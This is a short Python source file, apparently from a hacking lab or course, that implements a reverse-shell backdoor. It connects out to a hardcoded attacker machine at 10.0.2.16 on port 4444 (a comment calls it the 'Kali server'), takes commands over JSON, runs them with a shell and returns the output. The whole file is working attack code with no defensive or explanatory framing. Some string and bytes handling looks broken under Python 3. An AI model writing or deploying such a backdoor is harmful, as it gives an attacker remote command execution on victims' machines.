import socket
import subprocess
import json

class Backdoor:
    
    def __init__(self, ip, port) -> None:
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # connect to the Kali server
        self.conn.connect((ip, port))
        self.conn.send("\n[+] connection established.\n")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data)
    
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_system_command(self, cmd):
        # cmd can be either string or list of strings representing the single command
        return subprocess.check_output(cmd, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.conn.close()
                exit()

            cmd_result = self.exec_system_command(command)
            self.reliable_send(cmd_result)

backdoor = Backdoor("10.0.2.16", 4444)
backdoor.run()